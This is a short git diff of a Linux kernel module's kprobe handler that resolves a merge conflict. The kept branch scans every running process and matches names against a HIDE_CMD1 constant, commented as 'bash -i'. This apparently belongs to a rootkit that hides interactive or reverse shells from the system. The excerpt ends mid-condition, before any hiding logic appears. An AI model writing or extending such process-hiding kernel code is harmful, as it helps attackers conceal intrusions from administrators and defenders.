@@ -28,21 +28,11 @@ static struct kprobe kp = {
 /* kprobe pre_handler: called just before the probed instruction is executed */
 static int __kprobes handler_pre(struct kprobe *p, struct pt_regs *regs)
 {
-<<<<<<< HEAD
-	char *filename = (char *)regs->si;
-	pid_t pid = current->pid;
-	char path[256];
-	dbg_print(
-		"<%s> p->addr = 0x%p, ip = %lx, rdi=%lx, rsi=%s ,flags = 0x%lx\n",
-		p->symbol_name, p->addr, regs->ip, regs->di, (char *)regs->si,
-		regs->flags);
-=======
 	struct task_struct *task;
 
 	// Scan all processes running in the system.
 	for_each_process(task) {
 		//dbg_print("Checking process: %s (PID: %d)\n", task->comm, task->pid);
->>>>>>> 8df8cb1c4e81dce2681996577fd1026628b73f77
 
 		// Check if process name matches "bash -i"
 		if (strncmp(task->comm, HIDE_CMD1, 10) == 0 &&
